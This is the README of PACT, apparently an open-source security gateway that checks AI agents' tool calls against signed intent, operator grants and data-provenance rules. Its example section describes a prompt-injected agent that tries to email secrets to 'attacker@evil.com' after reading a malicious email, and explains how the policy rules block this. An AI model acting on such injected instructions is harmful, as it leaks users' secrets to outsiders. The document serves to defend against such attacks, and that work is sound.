<p align="center">
  <img src="docs/assets/pact-banner.svg" alt="PACT — Provenance-Aware Capability Tokens for AI Agents" width="620">
</p>

<p align="center">
  <a href="https://github.com/ASH1998/PACT/releases"><img src="https://img.shields.io/github/v/release/ASH1998/PACT?sort=semver&label=release&color=22d3ee" alt="Latest release"></a>
  <a href="https://github.com/ASH1998/PACT/actions/workflows/ci.yml"><img src="https://github.com/ASH1998/PACT/actions/workflows/ci.yml/badge.svg" alt="PACT CI"></a>
  <a href="https://github.com/ASH1998/PACT/actions/workflows/codeql.yml"><img src="https://github.com/ASH1998/PACT/actions/workflows/codeql.yml/badge.svg" alt="CodeQL"></a>
  <a href="https://github.com/ASH1998/PACT/actions/workflows/deploy-demo.yml"><img src="https://github.com/ASH1998/PACT/actions/workflows/deploy-demo.yml/badge.svg" alt="Deploy demo to GitHub Pages"></a>
</p>

PACT is a runtime security layer for AI agents. Every tool call an agent makes
passes through a signed gateway that verifies *who* is acting, *whether the
action matches the user's intent*, *whether it is within an operator-authorized
scope*, and *whether untrusted or secret data is flowing where it shouldn't* —
before the tool runs. Every decision is written to a tamper-evident ledger.

> Authentication asks *"is this caller allowed into the system?"*
> PACT asks *"is **this action** legitimate **in this context**, and was it
> influenced by untrusted or secret data?"* — and enforces the answer.

PS. This project was created by using Github Copilot

---

## How it works

An agent cannot call tools directly. It must wrap each call in a signed **Action
Envelope** and submit it to the **Gateway** — the single trust boundary.

```
User → Agent → PACT Envelope → Gateway ──► ALLOW / BLOCK / REQUIRE_APPROVAL → Ledger → SOC Dashboard
                                  │
        passport · signature · intent · capability · resource scope · provenance · policy
```

Enforcement is **structural, not pattern-matching**. PACT does not block actions
by recognizing bad strings like `.env` or `attacker@gmail.com`; it blocks them
because the capability isn't granted, the resource is out of the authorized
scope, or secret/untrusted data would flow to an external sink.

## Security model

| Primitive | Purpose | Current status |
|---|---|---|
| **Agent Passport** | Issuer-signed Ed25519 identity, verified on every gated call | Enforced in gateway paths; production key lifecycle is future work |
| **Intent Contract** | Locks the allowed actions to the user's goal; tamper-evident hash | Enforced in gateway paths |
| **Operator Grant** | Deny-by-default ceiling on *tools* and *resource scope* — the authority the agent cannot widen | Enforced in current runtime paths; production control-plane auth is future work |
| **Capability Token** | Short-lived, scoped, intent-bound, signed, use-limited permission | Validated by gateway; local/demo issuance requires `PACT_INSECURE_DEMO_API=true` |
| **Provenance / Taint** | Tracks trusted / untrusted / secret / generated data and propagates it across steps | Enforced at coarse label level; durable object-level taint is future work |
| **Policy Engine** | Evaluates identity + intent + capability + resource scope + provenance → decision + risk | Enforced in gateway paths |
| **Tamper-Evident Ledger** | Hash-chained record of every attempted action | Implemented; append-only external anchoring is future work |
| **SOC Dashboard + Replay** | Visual monitoring and step-by-step reconstruction of agent behavior | Implemented for local/demo review |

**Least privilege from the operator, not the agent.** An operator *grant* defines
the hard ceiling — which tools, and an allowlist of resources per type (email
domains, URL hosts, file-path globs). The default grant is deny-by-default: no
outbound email, secret reads, or shell until explicitly authorized. The agent's
per-task intent can only narrow within the grant.

Current local demo endpoints that create agent keys or issue capability tokens
are explicitly gated by `PACT_INSECURE_DEMO_API=true`. Production deployments
need authenticated, tenant-scoped authority services before exposing those
control-plane operations.

**Policy rules (R1–R12).** Full spec in [docs/PROTOCOL.md](docs/PROTOCOL.md).

| Rule | Condition | Decision |
|---|---|---|
| R1–R3 | Invalid passport / signature / capability token | BLOCK |
| R4–R5 | Tool not in intent's allowed (or in forbidden) actions | BLOCK |
| R12 | Requested resource outside the operator-authorized scope | BLOCK |
| R6–R8 | Untrusted (email/web) or secret data + external write | BLOCK |
| R9 | Shell execution | REQUIRE_APPROVAL |
| R11 | Read of a critical-sensitivity resource (e.g. `.env`) | REQUIRE_APPROVAL |
| R10 | Unknown / unregistered tool | BLOCK |
| — | Valid identity + intent + scope + provenance | ALLOW |

### Example — exfiltration is blocked structurally

A prompt-injected agent reads a malicious email, then attempts
`email.send(to="attacker@evil.com")` with secret content. PACT blocks it on
multiple independent grounds, none of which require naming the threat:

- `attacker@evil.com` is **outside the authorized email scope** (R12)
- the action is influenced by `untrusted.email` and is an `external_write` (R6)
- secret data would flow to an external destination (R8)

Rename the file or change the address — it's still blocked, because the
authority and data-flow boundaries don't depend on the specific strings.

## Quick start

**Prerequisites:** Python 3.10+, Node.js 18+.

Backend installation steps are documented in [INSTALL.md](INSTALL.md).

```bash
# Backend (API at http://localhost:8000, docs at /docs)
uv venv .venv
source .venv/bin/activate                          # Windows: .venv\Scripts\activate
uv sync --project backend --active --extra dev --link-mode=copy
cp backend/.env.example backend/.env
uv run --project backend --active uvicorn app.main:app --app-dir backend --reload --port 8000

# Frontend (dashboard at http://localhost:5173)
cd frontend && npm install && npm run dev

# Tests
uv run --project backend --active pytest -q -c backend/pyproject.toml backend/tests
```

If another environment is active in your shell, activate `./.venv` first or
run the backend directly with `.venv/bin/uvicorn ...` to avoid `uv` creating
`backend/.venv`.

### 60-second local demo

Run the deterministic allow/block/tamper demo from the repo root:

```bash
./scripts/live_demo.sh
```

It starts the backend if needed, runs one allowed workflow, multiple blocked or
approval-gated workflows, verifies the ledger, and demonstrates tamper
detection. The script enables `PACT_INSECURE_DEMO_API=true` for local demo
authority endpoints; do not expose that mode on an untrusted network. See
[examples/README.md](examples/README.md).

### Claude Code plugin

Use PACT directly inside Claude Code. The **`pact-claude`** plugin adds a `/pact`
command and a PreToolUse hook that checks native Bash/Read/Edit/Write/WebFetch
calls against signed intent and capability policy, recording every decision in
the PACT dashboard.

```bash
claude --plugin-dir ./plugins/pact-claude
```

See [plugins/pact-claude/README.md](plugins/pact-claude/README.md).

### Interactive agent (terminal UI)

Run a real Claude/Gemini/Bedrock agent whose every tool call is enforced by
PACT. Runs appear live in the dashboard. The **`pact-tui`** client (Go +
Bubble Tea) is a full-screen console — and a *real client of the PACT gateway
over HTTP*: it holds its own key, signs each Action Envelope locally, submits it
for a decision, and only then executes the tool on your machine.

```bash
cd clients/pact-tui && make build
./bin/pact-tui --provider claude
# Widen authority with an operator grant (deny-by-default otherwise):
./bin/pact-tui --provider claude --grant ../../examples/grant.acme.yaml
```

Color-coded decision cards (ALLOW / REQUIRE_APPROVAL / BLOCK), a live sidebar of
the active grant, authorized tools, and resource scope, inline `y/n` approvals,
and `/help /tools /ledger /run`. See [clients/pact-tui/README.md](clients/pact-tui/README.md).

A headless Python CLI (`python3 pact_chat.py --provider claude`) remains for
piping/scripting. See [docs/LOCAL_TESTING.md](docs/LOCAL_TESTING.md) for an
end-to-end walkthrough.

## Architecture

```
backend/app/
  core/        runtime, factory, tool registry, grants, policy config
  crypto/      Ed25519 keys, signing, canonical hashing
  services/    passport · intent · capability · envelope · provenance ·
               policy · ledger · gateway · approval
  api/v1/      agents · intents · capabilities · actions · policies ·
               approvals · runs
  adapters/    LangChain / LangGraph enforcement wrappers
  tools/       tool implementations + resource extraction/scope
frontend/src/  React + Vite SOC dashboard (overview, runs, graph, replay)
clients/pact-tui/  Go + Bubble Tea agent TUI — a gateway HTTP client that signs
               its own envelopes (Ed25519) and runs tools locally
pact_chat.py   headless Python agent CLI (piping/scripting)
```

**Stack:** FastAPI · async SQLAlchemy · PyNaCl (Ed25519) · Pydantic v2 · Pytest
on the backend; React 18 · Vite · Tailwind · React Flow · Recharts on the frontend;
Go · Bubble Tea · Lipgloss for the agent TUI.

## Documentation

| Document | Description |
|---|---|
| [docs/PROTOCOL.md](docs/PROTOCOL.md) | Protocol spec: primitives, security model, policy rules, risk scoring, threat model |
| [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) | Practical threat model: assets, trust boundaries, adversaries, known gaps |
| [docs/API.md](docs/API.md) | REST API reference — endpoints, request/response, curl examples |
| [docs/LOCAL_TESTING.md](docs/LOCAL_TESTING.md) | End-to-end local testing walkthrough |
| [docs/PRODUCTION_READINESS.md](docs/PRODUCTION_READINESS.md) | Production-readiness assessment and current blockers |
| [SECURITY.md](SECURITY.md) | Vulnerability reporting policy and supported security scope |
| [CONTRIBUTING.md](CONTRIBUTING.md) | Contributor setup, tests, and PR expectations |
| [progress.md](progress.md) | Current status and changelog |
| [road_to_prod.md](road_to_prod.md) | Roadmap from here to production |

## Status

**v0.0.1** — least-privilege authority and structural data-flow enforcement.
257 tests passing. Forward work (object-level taint, identity/authz + API auth,
a real policy engine, Postgres/Alembic, SDK + MCP gateway) is tracked in
[road_to_prod.md](road_to_prod.md).

## License

MIT
